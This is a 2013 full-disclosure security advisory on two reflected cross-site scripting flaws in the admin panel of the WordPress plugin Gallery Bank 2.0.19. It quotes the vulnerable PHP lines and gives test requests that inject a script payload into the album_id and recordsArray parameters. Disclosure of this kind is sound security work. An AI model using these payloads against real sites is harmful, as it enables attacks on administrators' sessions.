
Date: Tue, 5 Nov 2013 15:46:17 +0000
From: <advisories@...omio.com>
To: "full-disclosure@...ts.grok.org.uk"
 <full-disclosure@...ts.grok.org.uk>
Subject: [SOJOBO-ADV-13-03] - Wordpress plugin Gallery Bank 2.0.19 Reflected Cross Site Scripting

[SOJOBO-ADV-13-03] - Wordpress plugin Gallery Bank 2.0.19 Reflected Cross Site Scripting


I. * Information *
==================
Name : Wordpress plugin Gallery Bank 2.0.19 Reflected Cross Site Scripting
Software : Gallery Bank 2.0.19 and possibly below.
Vendor Homepage : http://gallery-bank.com/ http://wordpress.org/plugins/gallery-bank/
Vulnerability Type : Reflected Cross-Site Scripting
Severity : Medium (3/5)
Advisory Reference : SOJOBO-ADV-13-03 (http://www.enkomio.com/Advisories)
Credits: Sojobo dev team
Description: A Reflected Cross Site Scripting vulnerability was discovered during the testing of Sojobo, Static Analysis Tool.


II. * Details *
===============
A) Reflected Cross Site Scripting in edit-album.php on admin panel [Impact: 3/5]


Follow a trace to reach the vulnerable code.


File: \gallery-bank\views\edit-album.php
36: $album_id = $_GET["album_id"];
...
50: <input type="hidden" id="hidden_album_id" value="<?php echo $album_id;?>" />


A test request is: /wordpress/wp-admin/admin.php?page=edit_album&album_id="><script>alert('xss');</script>


B) Reflected Cross Site Scripting in album-gallery-bank-class.php on admin panel [Impact: 3/5]


Follow a trace to reach the vulnerable code.


File: \gallery-bank\gallery-bank\lib\album-gallery-bank-class.php
620: $updateRecordsArray = $_POST['recordsArray'];
...
624: foreach ($updateRecordsArray as $recordIDValue)
...
626: $record_val .= $recordIDValue . ",";
...
669: echo $record_val . "_" . $string_to_postback;


A test request is: /wordpress/wp-admin/admin.php?page=add_album&action=album_gallery_library&param=reorder_td_control and 
sending via POST the following data: recordsArray[]=<script>alert('xss');</script>


III. * Report Timeline *
========================


16 October 2013 - First contact
28 October 2013 - New version released


IV. * About Sojobo *
====================
Sojobo allows you to find security vulnerabilities in your PHP web application source code before others do.
By using the state of the art techniques Sojobo is able to identify the most critical vulnerabilities in your code and limit the number of false positives.
Content of type "text/html" skipped

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
